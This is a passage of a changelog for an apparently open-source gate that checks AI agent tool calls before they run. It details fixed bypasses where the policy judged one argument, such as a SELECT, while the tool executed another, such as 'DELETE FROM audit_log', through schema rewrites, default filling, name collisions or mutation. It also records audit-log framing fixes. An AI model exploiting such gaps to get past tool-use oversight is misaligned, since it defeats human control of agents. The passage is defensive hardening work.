record boundaries, and adapters separate policy observations from execution arguments.
This is a MINOR release under `STABILITY.md` because `AuditFramingError` is a new named
public exception exported from the package root. The verdict kernel, manifest v8 and
valid fingerprint bytes are unchanged. The broader model-safe error formatter is
separate work; existing general policy-error messages retain their documented plaintext
boundary.

### Fixed

- Two adapter paths handed the policy the live argument dict the tool would then run
  with: the Pydantic AI gate (`examples/pydantic_ai_gate.py`, both the capability and
  the `Hooks` route) and the local MCP server gate
  (`examples/openai_agents_mcp_gate.py`). A policy that gathered passing evidence for
  `SELECT` and then, by a bug, wrote `DELETE` into that dict had the tool run `DELETE`,
  through the real Runner on the MCP route. The policy now judges detached arguments
  and the tool runs with the dict itself, as the Responses, Chat, LangGraph, LangChain,
  Google ADK and CrewAI gates already did. The MCP gate deep-copies JSON arguments;
  Pydantic AI detaches JSON containers by construction and accepts Enum members only
  when their values are immutable JSON scalars, preserving member identity. Models,
  dataclasses, mutable-valued Enums and other objects refuse before policy evaluation:
  declare data-only parameters and validate inside the tool body. No application copy
  method or serializer runs. A detachment failure names only its exception class, never
  its text; the general policy-error plaintext boundary is unchanged. Containment of a
  buggy trusted policy, not a model-input
  bypass: a correct policy still refuses what it should. The conformance suite gains
  invariant 11, a mutating policy against every route of every adapter with its
  negative control, and the adapter tests add nested-container cases. The public
  `decide` is unchanged and its docstring now states the ownership contract: the
  policy receives the caller's object, the record fingerprints the proposal first, and
  a caller that executes what it adjudicated passes the policy a copy. Reported in the
  2026-11-05 company-adoption review.

- A file-backed `AuditLog.append` wrote the new entry at EOF whatever the file ended
  in. A complete final record that had lost its newline, or an incomplete record left
  by a killed writer, fused with the new entry into one line no reader could parse,
  while the append reported success and the hook let the call proceed: the decision
  was on disk and unreadable. The append now checks the line framing under the same
  inter-process lock as the write. A complete final record that lost its terminator
  is terminated first, so both records stay readable and chained; a file ending in an
  incomplete record refuses the append with `AuditFramingError` (an
  `AuditIntegrityError`, so a hook fails closed to a deny) before any byte is written,
  preserving the damaged bytes, and the error names the recovery: keep a copy,
  truncate to the offset it reports, `recusal audit verify`, resume. A corrupt line
  that has its terminator still does not brick the append, as before. Reported in the
  2026-11-05 company-adoption review.

### Changed

- The package docstring, the CLI description, the demo banner line, the plugin
  marketplace description and the docs index say governance for AI agents, not for
  Claude agents: the gate is framework-neutral, so the old wording was no longer true.
  The brand banners said the same and were redrawn in #216.

## [0.12.10] - 2026-11-04

Package changes and example changes, stated apart. In the installed package, two
control-result contracts: `recusal.claude_code.allowlist_policy` accepts only a real
`True` or `False` from an explicit predicate and refuses anything else with a finding
that names the type, and `recusal.claude.gate_tool_use` and `tool_confirmation` refuse
a malformed outer evidence value instead of folding it to no objections. Every valid
verdict, every fingerprint and the file format are unchanged: a PATCH under
`STABILITY.md`, named here. Under `examples/`, outside the wheel: the OpenAI Agents
gates bind each guardrail to its own tool by identity; composed policies hand every
leaf its own copy; the direct Responses and Chat loops, the Google ADK gate and the
CrewAI gate judge one prepared invocation with defaults completed first, each with an
explicit supported-shape contract; the Chat loop takes an explicit choice; the ADK
plugin refuses a call it cannot be last for; and CrewAI's blocked call is explained by
the reason that blocked it. The 2026-11-04 adapters review found the eight defects;
each fix carries the reviewer's probe as a test and its mutation evidence in the PR.
The README's banner, demo GIF and links now render on PyPI (absolute URLs).

### Fixed
- `examples/google_adk_gate.py`: `RecusalPlugin` has an explicit ordering contract. ADK
  plugin callbacks run before any agent's before-tool callbacks, so an agent callback that
  rewrote the arguments ran after the plugin had approved them, while the README called
  the plugin the same gate covering every agent. The plugin now judges a call only when
  nothing it cannot see runs after it: it refuses the call before judgment, naming the fix,
  when the executing agent (read from the invocation context) carries a
  `before_tool_callback` that is not a Recusal gate (`gated_agent`, which appends the gate
  last among the agent's callbacks), when a plugin listed after it overrides
  `before_tool_callback` (list `RecusalPlugin` last), or when the context does not expose
  an `LlmAgent`. `tests/test_adapter_conformance.py` gains invariant 10, a transform the
  framework runs after the gate's seam cannot change what runs, registered for both ADK
  routes. (Found in the 2026-11-04 adapters review.)
- `examples/crewai_gate.py` judges the invocation the tool receives. The before hook judged
  the dict the model proposed; CrewAI then validated it against the tool's `args_schema` at
  execution, filling omitted defaults and coercing values, so `charge(amount: int = 100)`
  proposed with `{}` reached a budget policy as `{}` and ran 100. The hook now completes
  omitted fields from the schema's defaults into the raw input, runs the schema's
  `model_validate` once, writes the validated values back into the dict CrewAI executes and
  judges a copy. So that this one preparation is the one CrewAI repeats, the gate supports
  only a stock tool and schema: a `CrewStructuredTool` and `BaseTool` keeping CrewAI's own
  run and validation methods, and a schema that is a direct `BaseModel` subclass with no
  members of its own, configuration limited to `extra` and `title`, and every field equal
  to the canonical `FieldInfo` of a bare declaration (a supported annotation, an optional
  JSON default, description and title). CrewAI's generated schemas are exactly that; a
  validator, an overridden `model_validate`, an intermediate base, `model_post_init`, a
  core-schema override, `exclude`, `exclude_if`, `default_factory`, an alias, a constraint,
  an unsupported annotation, an unknown parameter, a missing required one and a validation
  failure (reported by field name only, without Pydantic's text, which carries input
  values) are refused before judgment. `tests/test_adapter_conformance.py` registers
  CrewAI for invariant 6 (a rewriting schema is refused, the rewrite never runs) and
  invariant 8, and states invariant 9 for it. (Found in the 2026-11-04 adapters review.)
- `examples/openai_responses_gate.py` and `examples/google_adk_gate.py` judge one prepared
  invocation with defaults completed first. The direct loops judged the decoded JSON and
  let Python fill omitted defaults after judgment; the ADK callback and plugin judged the
  raw args dict before the ADK's own preparation coerced it: `charge(amount: int = 100)`
  proposed with `{}` reached a budget policy as `{}` and ran 100 on both, and on the ADK
  `amount: int = "100"` was judged as a str and received as an int. The direct loops now
  bind the call to the signature with `apply_defaults` and run the bound invocation; the
  ADK gate completes omitted parameters from the function's defaults into the raw
  arguments, runs the tool's `_preprocess_args_with_validation` once, writes the converted
  values back (the ADK calls the tool with that dict) and judges a copy, with the
  validation feature on or off. Both support only parameters annotated `str`, `int`,
  `float`, `bool`, optionals and lists or string-keyed dicts of those, with JSON defaults,
  on a `FunctionTool` that keeps the stock preparation methods (the ADK's built-in
  subclasses do); a model-typed, `Annotated`, `Enum`, variadic, positional-only or
  unannotated parameter is refused, as is an unknown parameter, a missing required one and
  a validation failure (reported without the SDK's text, which carries input values).
  `tests/test_adapter_conformance.py` gains invariant 8, an omitted default is judged at
  the value the callable uses, registered for the direct loops, the ADK, LangGraph, the
  LangChain middleware and the OpenAI Agents function tools, and states invariant 9.
  (Found in the 2026-11-04 adapters review.)
- `examples/crewai_gate.py`: a blocked call is explained by the reason the before hook
  blocked on, never by a second judgment. The after hook re-judged the call to find the
  reason, so a stateful policy that denied once and allowed next was invoked twice and
  the model received only CrewAI's generic blocked line. The before hook now keeps its
  reason beside a strong reference to the invocation's argument object in a small
  per-thread list (CrewAI hands the same `tool_input` dict to both hooks of one invocation
  on one thread; the sync Crew runner gives every invocation a fresh dict), dropping any
  entry for the same object first so an abandoned entry is never attached to a later call
  that reuses the dict; the after hook returns a reason only for that very object and
  otherwise keeps CrewAI's line. A failure to keep or find a reason never changes the
  block. (Found in the 2026-11-04 adapters review.)
- `examples/openai_responses_gate.py`: `gate_tool_calls` dispatches the tool calls of one
  chosen Chat Completions message. It flattened the `tool_calls` of every entry in
  `completion.choices`, so a completion requested with `n > 1` (alternative assistant
  messages, each with its own call ids) had every alternative's calls judged and run: two
  choices charging 5 and 7 both executed. A completion with one choice dispatches as
  before; with several, the call must pass `choice=<list position>` and only that message
  is dispatched; no choices, a non-int or bool `choice`, or an out-of-range one is refused
  before any call is judged. (Found in the 2026-11-04 adapters review.)
- `recusal.claude_code.allowlist_policy`: an explicit predicate's result is held to its
  `bool` contract. The result was read with truthiness, so `"false"`, `{"allowed": False}`
  and a failed `Finding` returned by a mistaken predicate all read as True and removed the
  allowlist's refusal (the decision was `defer`). Only `True` allows and only `False`
  refuses now; any other result is a CRITICAL `allowlist_predicate_contract` finding that
  names the type, so the tool is denied and the reason says why. (Found in the
  2026-11-04 adapters review.)
- `recusal.claude.gate_tool_use` and `tool_confirmation` refuse a malformed outer evidence
  container by name. The helpers folded whatever iterable they were given, and `{}`, `""`
  and `b""` iterate to nothing, so an invalid empty container passed as a clean screen
  (`allow`). A mapping, a string, bytes, a number, a bool or `None` is now refused as
  `invalid evidence (evidence was dict; pass a list of findings)`; a real empty list keeps
  its pass meaning and any other iterable folds as before. The plugin's vendored runtime
  is resynced. (Found in the 2026-11-04 adapters review.)
- `examples/composed_policies.py`: every leaf of a composition judges its own deep copy
  of the input. The composer handed one mutable dict to each leaf in turn, so a leaf that
  rewrote it (a normalizer turning `DELETE` into `SELECT`) changed what every later leaf
  judged while the adapter executed the original: with the normalizer listed first, the
  SQL check approved `SELECT` and LangGraph, the audited gate and the OpenAI Agents gate
  executed `DELETE`; reversed, the check refused. The fold assumes one fixed input per
  verdict, and the composition now honours it: a mutating leaf affects only itself,
  the caller's dict is never changed, a value that cannot be copied fails closed, and
  reordering observational leaves cannot change the verdict. Transformation leaves are
  not supported. Identity, binding and reset forwarding are unchanged. (Found in the
  2026-11-04 adapters review.)
- `examples/openai_agents_gate.py` and `examples/openai_agents_mcp_gate.py`: each
  guardrail is bound to the tool it protects, and an agent whose function tools share a
  name is refused. The guardrail looked its tool up by name from the agent's tool list and
  took the first match, while the SDK's lookup map (`agents/_tool_identity.py`) is
  last-wins: with a gated sub-agent exposed as `run_sql` listed before a function tool of
  the same name, the guardrail judged the agent tool's raw `SELECT` and the SDK executed
  the function tool, whose schema rewrote it to `DELETE`, in both the run and streamed
  routes, with `is_gated` true. `gate_tools` now builds one guardrail per tool, bound to
  the gated copy it returns, so the guardrail judges and pins the very object the agent
  executes; `gate_tools` raises on tools sharing a name, and `gated_agent` (both modules)
  and `is_gated` refuse an agent whose function tools do, checked over the whole tool list
  before any wrapping. A standalone `recusal_guardrail(policy)` is bound to no tool and
  refuses every call. (Found in the 2026-11-04 adapters review.)

## [0.12.9] - 2026-11-04

Package changes and example changes, stated apart. In the installed package, two
audit-record fixes: `recusal.claude_code.decide` and `run_pretooluse_hook` fingerprint
the proposed input before the policy sees it, so a policy that mutates its argument
cannot write the mutation onto the record, and `recusal.audit.AuditLog.append` serializes
concurrent threads of one process around the whole append, so the in-memory mirror
stays in chain order. Every valid fingerprint, the file format and every
single-threaded behaviour are unchanged: a PATCH under `STABILITY.md`, named here. Under
`examples/`, outside the wheel: the LangGraph gate completes a schema parameter the
framework's parse suppressed from the callable's default before judgment, and forwards a
validation message only when it is Pydantic's own template. The 2026-11-04 follow-up
review found the three defects; each fix carries the reviewer's probe as a test.

### Fixed
- `recusal.audit.AuditLog.append` serializes concurrent threads of one process around the
  whole append. The file transaction was under the inter-process lock but the in-memory
  mirror (`entries`, `_next_seq`, `last_hash`) was updated after it was released, so two
  threads of a LangGraph `ToolNode` (which runs one turn's calls on a thread pool) could
  append to the file in order and to the mirror out of order; an in-memory log had no
  lock at all. Seen once on a CI lane as `[1, 0, 2, ...]` in `entries`; the file was
  intact. The file format, hashes and every single-threaded behaviour are unchanged.
- `recusal.claude_code.decide` and `run_pretooluse_hook` fingerprint the proposed input
  for the audit record before the policy sees it. The fingerprint was taken after the
  policy ran, on the same dict the policy received, so a policy that mutated its argument
  wrote the mutation onto the record while the caller executed the proposal: the LangGraph
  audited gate ran `SELECT`, the policy had changed its view to `DELETE`, and the entry's
  `input_sha256` was the fingerprint of `DELETE` (reproduced sync and async). With a log,
  an input the record cannot bind is now refused before the policy runs (it was refused
  after, with the policy's side effects); fail-open behaviour and every valid fingerprint
  are unchanged. The LangGraph seam keeps handing the policy its detached projection, which
  the record now binds as proposed. Invariant 7 in `tests/test_adapter_conformance.py`
  states the rule. The plugin's vendored runtime is resynced. (Found in the 2026-11-04
  follow-up review.)
- `examples/langgraph_gate.py`: a validation message is forwarded to the model and the
  audit record only when it is Pydantic's own template for a model-facing field. The
  sanitizer reduced errors under a host-supplied argument to their type but forwarded
  every other message verbatim, so a `model_validator` (an error at location `()`) that
  composed its `ValueError` from injected graph state put that state into the error
  ToolMessage and the audit reason, on both routes. Root-level errors, errors under a
  host key, and errors of the user-written types `value_error` and `assertion_error`
  are now reported as location and error type only; a standard type error on a
  model-facing field keeps its location and template message. (Found in the 2026-11-04
  follow-up review.)
- `examples/langgraph_gate.py`: a schema parameter the framework's parse suppressed is
  completed from the callable's default before judgment and executed as judged.
  LangChain's `_parse_input` selects the kwargs it returns through the argument model's own
  `model_dump()`, so a field with `exclude=True`, or a root `model_serializer` returning
  `{}`, dropped the model's proposal before the gate's projection ran: a proposed amount
  of 5 reached a budget policy as `{}`, which raised no objection, and the function ran
  its default of 100 (reproduced on the LangGraph, LangChain and audited routes). The
  seam now reads the callable's signature (`func`/`coroutine`, else `_run`) and passes each
  schema-declared, non-host parameter the parse left out explicitly from its default, so
  the policy sees 100 and refuses; a suppressed parameter with no default is refused as
  unjudgeable. Framework-filled parameters (`run_manager`, `callbacks`, config) are not
  schema fields and are untouched, so an ordinary tool's judged view is unchanged. The
  docs no longer say no serializer runs in the parse path, only that the projection runs
  none. (Found in the 2026-11-04 follow-up review.)

## [0.12.8] - 2026-11-04

Package changes and example changes, stated apart. In the installed package, two
fail-closed fixes to the policy contract: `recusal.claude_code.decide` refuses a policy
return that is not `None` or an iterable of findings (a bool, a number, a string or a bare
mapping was read as an empty screen and the tool ran), and `recusal.mcp.manifest_policy`
holds its wrapped policy to that same contract and treats only `None` as no policy.
Malformed policy output now refuses instead of passing; a valid policy folds exactly as
in 0.12.7, so this is a PATCH under `STABILITY.md`, named here. Under `examples/`, outside
the wheel: the LangGraph gate judges the final invocation once, inside the tool's own
parse step after host injection; the OpenAI Agents gate judges the invocation the SDK
prepares; the OpenAI MCP gates check a policy's naming domain and keep a composed
policy's server binding; the composer shares the evaluator's identity discovery and
return contract; the conformance suite gains invariant 6. Two outside architecture
reviews of main (2026-11-03 and 2026-11-04) found these; each fix carries the reviewer's
probe as a test.

### Fixed
- `recusal.mcp.manifest_policy` and `examples/composed_policies.py` hold each wrapped
  policy's return to the evaluator's contract before reading it. `decide` refuses a bare
  `{}`, `""` or `b""` as a policy error, but the composition extended its findings with
  the raw return and the manifest wrapper called `list()` on it, so an empty invalid
  container became an empty screen (`defer`, and the OpenAI Runner executed the call)
  while the accepted `None` became an iteration error. Both now pass every leaf return
  through the same `_findings_of` the evaluator uses, on the MCP and non-MCP manifest
  paths, so direct, composed, manifest-wrapped and nested evaluations decide and reason
  identically; the manifest wrapper treats only `None` as an absent wrapped policy, so a
  callable whose `__bool__` is false is still called. `compute_verdict` is unchanged. The
  plugin's vendored runtime is resynced. (Found in the 2026-11-04 architecture review.)
- `examples/composed_policies.py` and `examples/openai_agents_mcp_gate.py`: a composition
  keeps the server its policy is bound to. `claude_named("db", policy)` was refused on
  any other server, but `compose_policies(claude_named("db", policy), other_check)`
  carried neither the binding nor the naming domain, so the composition installed on a
  server named `other` and the Runner executed `other/run_sql` against the approval for
  `db/run_sql`. `ComposedPolicy` now exposes `recusal_bound_server`, the one server any
  leaf is bound to, through nesting and kept subclasses; leaves bound to different
  servers, or a bound leaf beside an unbound manifest policy, are refused at composition;
  both MCP gates check the naming requirement before the binding; `claude_named` returns a
  policy already bound to that server unchanged and refuses one bound elsewhere. (Found in
  the 2026-11-04 architecture review.)
- `examples/langgraph_gate.py` (and the audited gate and LangChain middleware built on it)
  judges the final invocation once, inside the tool's own parse step. The previous fix
  validated in the hook, before ToolNode injected the host's state, judged a
  `to_jsonable_python` projection, then validated again in a pinned copy and compared
  projections: a nested model's `field_serializer` showed the policy `SELECT` while the
  field the tool read held `DELETE` (reproduced on the LangGraph, LangChain and audited
  routes, sync and async); a validator returning `1` then `True` passed the comparison
  because `1 == True`; and a tool with a required `InjectedState` was refused as missing
  its state before the policy ran. Execution now gets a per-call copy whose
  `_to_args_and_kwargs` (run by `BaseTool.run`/`arun` after `ToolNode` has injected state,
  store and runtime) parses once, projects every model-controlled argument through an
  explicit serializer-free projection (`_faithful`: scalars, finite numbers, Enum values,
  ISO dates, Decimal and UUID strings, lists, string-keyed dicts, Pydantic v2 models and
  dataclasses field by field; anything else refused), decides, and hands the very objects
  it parsed to the function, so there is no second validation and nothing to compare.
  Host-injected arguments are excluded from judgment and cannot be supplied by the model;
  a field an `extra="allow"` schema accepts is judged. A tool whose class or instance
  overrides `invoke`, `ainvoke`, `run`, `arun` or `_to_args_and_kwargs` is refused, since
  it may execute without reaching the seam. A refusal is a `RecusalRefusal` (a
  `ToolException`) that only the copy's handler turns into the error message; every other
  `ToolException` keeps the tool's own `handle_tool_error` setting, and a node-level
  error handler cannot replace the reason. A validation failure is reported as location
  and message only, and for a host-supplied argument as the error type only, so graph
  state never reaches the model or the audit record. A LangChain middleware listed after
  the gate that rewrites arguments is judged on the rewritten value; one that replaces
  the tool or answers in its place (`LLMToolEmulator`) bypasses the copy, so the gate
  still goes last. `_pinned`, `ChangedAfterJudgment` and `refuse_changed` are removed.
  (Found in the 2026-11-04 architecture review.)
- The OpenAI Agents and LangGraph gates (and the LangChain middleware and the audited
  LangGraph gate built on it) judge the invocation the tool will execute, not the arguments
  the model wrote. Both frameworks validate arguments after the hook (the SDK's generated
  parameter model; a tool's `args_schema`), so a validator, a default or a coercion could make
  the function receive a value the policy never saw: the review's probe passed `SELECT 1`
  through the gate and the tool received `DELETE FROM audit_log`, and `{"amount": "50"}`
  slipped past an integer budget check as a string. `examples/openai_agents_gate.py` now
  judges the invocation the SDK prepares (validated, defaults filled, types coerced) and pins
  it on the tool context so the SDK executes exactly that; a parameter model the SDK will not
  prepare (a custom validator, a nested application model) is refused, since the value it
  would execute cannot be judged, and a hand-built `FunctionTool` is refused at setup.
  `examples/langgraph_gate.py` judges the invocation the tool executes (see the next entry
  for the final shape); an input the tool rejects or an unknown tool is refused through
  `decide`, so the audited gate logs it. `tests/test_adapter_conformance.py` gains invariant 6, a
  rewriting schema never runs the rewritten value, registered for these three adapters and
  stating which others sit after validation by design and which are not yet examined. (Found
  in the 2026-11-03 architecture review.)
- `examples/openai_agents_mcp_gate.py`: a policy's naming domain is checked at setup, and
  `claude_named(server_name, policy)` bridges it. `recusal.mcp.manifest_policy` judges Claude
  Code's `mcp__<server>__<tool>` names; the local and hosted MCP gates hand a policy the
  server's own tool name, so a manifest policy plugged in directly saw no MCP name, ran no
  membership check and raised no objection (a missing manifest let a call run). The manifest
  policy now declares its domain (`recusal_name_domain = "claude_code"`, forwarded by
  `compose_policies`), `gate_mcp_server` and `gate_hosted_mcp` refuse an unbound policy of
  that domain with a `ValueError` naming the fix, and `claude_named` presents each call as
  `mcp__{server}__{tool}`, is refused for any other server, and carries the manifest digest
  to the audit record. Raw-name policies are unchanged. (Found in the 2026-11-03
  architecture review.)
- `examples/composed_policies.py` and the evaluator share one identity-discovery contract.
  The evaluator honors two shapes of control identity, a `get_control_identity()` method
  and the legacy `last_manifest_digest` attribute; the composer detected only the method on
  plain leaves, so a legacy carrier, or a `ComposedPolicy` subclass overriding the getter
  with no manifest leaf inside, kept its verdict through `compose_policies` and lost its
  `manifest_sha256` on the audit record. `recusal.claude_code._identity_getter` (private)
  is now the one function both read through; the composer counts a carrier of any shape
  toward the one-per-gate rule and forwards its identity. `docs/ARCHITECTURE.md` now dates
  the second extraction to 0.12.7 and no longer calls `recusal.mcp` pure (`load_manifest`
  reads a file). (Found in the 2026-11-03 architecture review.)
- `recusal.claude_code.decide` (the evaluator every adapter reuses): a policy's return
  value is held to its contract before the verdict fold. `policy(...) or []` read every
  false value, `False`, `0`, `""` and `{}`, as "no findings", so a predicate written as a
  policy, or an error sentinel, switched its check off silently: the decision was `defer`
  and the tool ran. Only `None` and an iterable of findings are accepted now; a bool, a
  number, a string or a bare dict is a policy error, so the gate fails closed and the
  reason names the value. Pinned at `decide`, on the audit record and through the OpenAI
  Responses adapter. (Found in the 2026-11-03 architecture review.)

### Added
- `.editorconfig` at the repository root, stating the conventions the repository already
  enforces (UTF-8, LF, final newline, spaces; 4 for Python with a 100-column line, 2 for
  YAML and JSON), and `tests/test_editorconfig_contract.py`, which holds its Python line
  length equal to Ruff's `line-length` in `pyproject.toml` so the two cannot drift apart.
  Contributed by @Varma0604 in #178. (#170)
- `tests/test_mcp_name_properties.py`: Hypothesis property tests for the two MCP name
  helpers at the project's deterministic settings. `plugin_callable_name` is idempotent,
  every output character is in the documented safe class, and the result equals the
  docstring rule applied by hand; `split_mcp_tool_name` is None without the `mcp__` prefix
  and round-trips `mcp__{server}__{tool}` whenever the two parts form one flat name. The
  flat-namespace ambiguity of `mcp__a__b__c` stays unpinned, as `manifest_policy`
  documents. Contributed by @ZYZ666-RGB in #183. (#169)

## [0.12.7] - 2026-11-02

Package changes and example changes, stated apart. In the installed package: two
facade-preserving extractions (the neutral evaluator to `recusal/_adjudicate.py`, the
call-time manifest policy to `recusal/_manifest_policy.py`), code moved verbatim with every
public import, signature and audit record pinned unchanged; no behaviour changes. Under
`examples/`, outside the wheel: the OpenAI Agents MCP gate now binds one policy per server
connection and refuses a different one, `compose_policies` flattens nested groups and keeps
a `ComposedPolicy` subclass whole so an overridden `__call__` keeps running, and one
conformance suite runs the same five invariants against every Tested adapter. Three outside
reviews of main on 2026-11-02 found the example defects; each fix carries the reviewer's
probe as a test. PATCH under `STABILITY.md`: the gate behaves exactly as in 0.12.6.

### Changed
- Two facade-preserving extractions, code moved verbatim and every public import path
  unchanged. The neutral evaluator (`decide`, the one audit-record path and the control
  identity it writes) moved from `recusal/claude_code.py` to the private
  `recusal/_adjudicate.py`; `claude_code` keeps the hook, its event parsing and the allowlist,
  and keeps `decide` as a wrapper with the same signature, docstring and module, re-exporting
  The call-time manifest policy (file-backed, locked, cached, with its invocation-local
  digest) moved from `recusal/mcp.py` to the private `recusal/_manifest_policy.py`; `mcp`
  keeps the artifact half (build, compare, validate) and `manifest_policy` as the same kind of
  wrapper. `tests/test_extractions.py` pins the facades (wrappers over the moved code, same
  boundaries (the evaluator imports no adapter, persistence or MCP code; the policy module
  imports `mcp` only at call time, so either private module can be imported first), and
  holds `decide` to an audit record captured before the move. (From the 2026-11-02
  architecture review.)

### Added
- `tests/test_adapter_conformance.py`: one contract for every framework adapter. Five
  invariants, stated once and run against each adapter through a normalizer per route
  (LangGraph sync and async, LangChain sync and async, OpenAI Agents run and streamed, the
  OpenAI Agents local MCP server, the Responses and Chat Completions loops, Google ADK
  callback and plugin, CrewAI hooks, Pydantic AI capability and hooks): the arguments the
  policy judged are the arguments the tool ran with; a refusal runs nothing and its reason
  reaches the model; calls in one turn are judged separately; a raising policy fails
  closed; the ungated control runs the same call. Invariants only some adapters can express
  (batch rejection, renaming, delegation, composition provenance) stay in their own tests
  and the docstring says where. Two drift locks: every Tested `*_gate.py` example is
  registered, and the file runs in every runtime lane of `ci.yml` and `compat.yml`.
  `CONTRIBUTING.md` adds the registration step to "Adding a runtime". (From the
  2026-11-02 architecture review.)

### Fixed
- `examples/composed_policies.py`: a `ComposedPolicy` subclass is kept as one leaf when
  composed. Flattening unwrapped every instance, subclasses included, to its `.policies`,
  so a subclass that overrode `__call__` to add a refusal lost that refusal inside
  `compose_policies` (deny alone, defer wrapped; a raising override was skipped the same
  way). Only the exact class is flattened now; a subclass runs whole, its own manifest
  carrier counts once toward the one-per-gate rule, and plain subclasses are not mistaken
  for carriers. Pinned by the reviewer's probe as tests. (Found in the fourth 2026-11-02
  review.)
- `examples/openai_agents_mcp_gate.py`: a gated server carries one policy. `gate_mcp_server`
  on an already gated server is a no-op for the same policy object and refuses a different
  one with a `ValueError`; before, it returned silently and the first policy kept running
  while an agent sharing the connection reported itself gated under the second (the
  connection is shared by every agent that lists the server object, so replacing it silently
  would be wrong too). Pinned by the reviewer's sequence as a test. (Found in the third
  2026-11-02 review.)
- `examples/composed_policies.py`: nested compositions are flattened into their leaves, in
  order, before the manifest-policy count, so a group of plain policies no longer counts as
  a carrier; `compose_policies(compose_policies(a), compose_policies(b))` composes, a plain
  group beside one manifest policy keeps that policy's identity, and two manifest policies
  across nesting are still refused. (Same review.)
- `examples/openai_agents_mcp_gate.py`: the local-server gate moved from a tool input
  guardrail on the public tool name to a wrapper on the server's own `call_tool`, the one
  point where the SDK hands over the server's tool name and the exact argument dict it will
  run, after any approval. The 0.12.6 fix mapped one prefix back; the SDK also sanitizes,
  hashes on collision or on a name a function tool holds, and shortens, so a policy keyed
  on the server's tool name could still miss the capability that executed. The tests now
  run the SDK's naming pipeline (plain, prefixed, colliding servers, a sanitized name, a raw
  name that looks prefixed, a shortened name) and assert the policy saw the raw name and
  nothing ran; the surface probe pins what `call_tool` receives under each. (Found in the
  2026-11-02 architecture review.)
- `examples/composed_policies.py` (recipe 10): `compose_policies` returns a `ComposedPolicy`
  that forwards `get_control_identity` and `reset_control_identity`, so a composition
  containing `manifest_policy` records the same `manifest_sha256` the direct policy does;
  before, the verdict survived and the manifest provenance silently disappeared from the
  audit record. Adding a no-op policy changes neither the verdict nor the control
  identity, pinned by the tests; two manifest policies in one gate are refused up front.
  (Same review.)

## [0.12.6] - 2026-11-02

Two more agent runtimes are Tested, Pydantic AI and the OpenAI Agents SDK's MCP tools (local
servers and hosted MCP), each at the runtime's own hook, and the Claude Code plugin's hook
command is now the empty-root guard plus one path, for the plugin directory's rules. Three
findings from an outside review of main are fixed: the OpenAI API example refused a turn with
a duplicate call id only after its calls had run, the OpenAI MCP gate judged a prefixed public
name instead of the server's own tool name, and two documents stated the hook-timeout outcome
without its conditions. PATCH under `STABILITY.md`: no public surface changes, and the gate
behaves exactly as in 0.12.5. The examples live under `examples/` and are not part of the
installed package.
### Changed
- `claude-plugin/hooks/hooks.json`: the plugin's hook command is now the empty-root guard
  followed by one path, `sh "${CLAUDE_PLUGIN_ROOT}/scripts/gate.sh"`; the interpreter loop
  that was inline moved, unchanged, into that new file. The plugin directory's submission
  checklist requires a hook command in a subfolder plugin to be a single path from
  `${CLAUDE_PLUGIN_ROOT}` with no other variable, substitution, wildcard or inline program.
  The guard stays in the command so an empty root is still refused by name on every Claude
  Code version before any file is looked up. `gate.sh` is written by `tools/vendor_plugin.py`
  from the same launcher function `init` uses, and `tests/test_claude_plugin.py` holds the
  command and the file byte-for-byte; the empty-root and control runs in
  `tests/test_launcher_empty_root.py` now exercise the two-part launcher.

### Added
- `examples/openai_agents_mcp_gate.py`: gates the OpenAI Agents SDK's MCP tools, the two
  paths the function-tool example names as out of its sight. A local MCP server's tools
  become function tools at run time and the SDK copies the server's `tool_input_guardrails`
  onto each one, so `gate_mcp_server(server, policy)` appends `recusal_guardrail` to the
  server in place and every tool it lists is judged before it runs, after any approval; a
  refusal is the call's output. Hosted MCP runs on OpenAI's servers, and its one local point
  is the approval callback: `gate_hosted_mcp(tool, policy)` returns a copy that requires
  approval for every call and answers a refusal as a rejection with the reason, an existing
  callback still running for allowed calls; a hosted tool with any other `require_approval`
  is reported ungated, since a call OpenAI does not ask about is never seen. `gated_agent`
  gates function tools, servers and hosted tools together. The policy sees the server's own
  tool name: under `include_server_in_tool_names` the gate maps the prefixed public name back
  before judging (a hash-shortened name is the one form it cannot map). The tests pin that,
  that an approval never skips the guardrail, and
  the rejection the SDK sends back; the surface probe pins the server and hosted-tool fields.
  Offline with an in-process MCP server and a scripted approval request, the same pins and
  CI jobs as the function-tool example. "Works with" marks the row Tested. (#108)
- `examples/pydantic_ai_gate.py`: gates Pydantic AI tool calls with the framework's own
  `before_tool_execute` hook, which runs with the validated argument dict immediately before a
  tool runs. `RecusalGate(policy)` is a capability that judges each call there with `decide`
  and raises `ToolFailed(reason)` on a refusal, so the model reads the reason as a failed tool
  result, the tool never runs, and no retry budget is spent; it declares itself `innermost`,
  so the framework sorts it after every ordinary capability and it judges the arguments as
  they reach the tool. `recusal_before_tool_execute(policy)` is the same gate as a plain hook
  for `Hooks`. The tests pin the ordering trap (a later hook can change the arguments the gate
  judged; a plain hook must be listed last, another `innermost` capability after the gate is
  the one remaining way past it), that a refusal spends no retry budget, that `tools=`,
  `toolsets=` and per-run capabilities all pass through the hook, and that an agent called
  from inside a tool runs under its own capabilities (the miss, and a gate on the child or
  per run as the fixes). Offline with a scripted `FunctionModel`, Python 3.11+, tested with
  exactly `pydantic-ai-slim==2.64.0`, two new CI jobs and a weekly latest lane; Pydantic AI
  stays out of the package's dependencies. "Works with" marks Pydantic AI Tested. (#107)
- `claude-plugin/.claude-plugin/icon.png`: a 1024 px listing icon for the plugin directory (a ring
  with a bar across it), generated deterministically; the directory takes the icon once, on first
  submission. `*.png` is pinned binary in `.gitattributes`.
- `tests/test_langgraph_interrupt.py`: LangGraph pause, resume and replay against
  `recusal_gate`, on `langgraph==1.2.12` with an `InMemorySaver` checkpointer. A review node
  that calls `interrupt()` before the `ToolNode` is judged once, on resume, as the call will
  run (an edit to `DELETE` is refused; a policy revoked or a grant expired during the pause
  refuses the resumed call); a tool that calls `interrupt()` itself is judged before the pause
  and again on resume, one execution; a replay or fork from a checkpoint is a new execution
  judged again under the current policy. Negative controls run the `DELETE` without the gate.
  The one pattern outside a pre-tool gate, a value supplied on resume and consumed inside the
  tool, is pinned as a known limitation (the test asserts the `DELETE` runs, so a LangGraph
  change that routes resume values through the hook shows up). The file joins the two
  LangGraph CI jobs and the weekly latest lane; README and cookbook paragraphs explain the
  rule and the limitation. "Works with" marks the row Tested. (#80)

### Fixed
- `examples/openai_responses_gate.py`: a turn with a duplicate call id, a call without one, or
  an output item this adapter does not handle is refused before any call in it runs. Both the
  Responses and the Chat Completions adapter validated ids only after dispatch, so two accepted
  calls with the same id both ran and the refusal arrived after their side effects, which a
  caller's retry would repeat; an unhandled item mid-turn likewise raised after the calls
  before it had run. The turn is now checked in a first pass and nothing is dispatched until
